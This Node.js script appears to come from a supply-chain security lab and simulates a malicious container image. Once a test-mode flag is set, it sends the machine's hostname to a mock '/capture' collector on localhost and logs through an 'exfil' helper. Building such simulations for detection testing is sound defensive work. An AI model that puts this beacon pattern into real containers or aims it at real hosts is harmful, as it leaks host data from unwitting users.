const http = require('http');
const os = require('os');
const fs = require('fs');

if (process.env.TESTBENCH_MODE !== 'enabled') {
  console.log('TESTBENCH_MODE not enabled — benign exit.');
  process.exit(0);
}

const inDocker = fs.existsSync('/.dockerenv');
const mockHost =
  process.env.SCAS_MOCK_HOST ||
  (inDocker ? 'host.docker.internal' : '127.0.0.1');
const mockPort = Number(process.env.SCAS_MOCK_PORT || 3002);

const payloadObj = {
  host: os.hostname(),
  ts: Date.now(),
  scenario: '14-container-image',
};
const payload = JSON.stringify(payloadObj);

function finish(code) {
  try {
    const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
    uploadJson('14', 'runtime-beacon', payloadObj);
  } catch (_) {}
  console.log('Malicious container started (simulated).');
  process.exit(code);
}

const req = http.request(
  {
    hostname: mockHost,
    port: mockPort,
    path: '/capture',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
    },
  },
  (res) => {
    res.resume();
    res.on('end', () => finish(0));
  },
);
req.on('error', () => {
  // Still exit 0 so the lab can complete offline; capture verify needs mock up
  console.log('Mock collector unreachable — beacon skipped.');
  finish(0);
});
req.setTimeout(3000, () => {
  req.destroy();
});
req.write(payload);
req.end();
